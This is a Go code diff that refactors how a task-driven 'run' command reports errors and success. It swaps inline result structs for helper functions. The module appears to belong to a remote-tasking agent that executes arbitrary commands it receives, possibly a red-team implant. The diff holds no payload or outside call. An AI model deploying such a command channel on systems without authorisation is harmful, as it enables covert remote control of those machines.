@@ -1,7 +1,6 @@
 package commands
 
 import (
-	"fmt"
 	"strings"
 
 	"fawkes/pkg/structs"
@@ -23,11 +22,7 @@ func (c *RunCommand) Description() string {
 // Execute executes the run command
 func (c *RunCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: No command specified",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: No command specified")
 	}
 
 	// executeRunCommand is platform-specific:
@@ -39,17 +34,9 @@ func (c *RunCommand) Execute(task structs.Task) structs.CommandResult {
 	if err != nil {
 		outputStr := strings.TrimSpace(output)
 		if outputStr != "" {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("%s\nError: %v", outputStr, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("%s\nError: %v", outputStr, err)
 		}
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error executing command: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error executing command: %v", err)
 	}
 
 	outputStr := strings.TrimSpace(output)
@@ -57,9 +44,5 @@ func (c *RunCommand) Execute(task structs.Task) structs.CommandResult {
 		outputStr = "Command executed successfully (no output)"
 	}
 
-	return structs.CommandResult{
-		Output:    outputStr,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(outputStr)
 }
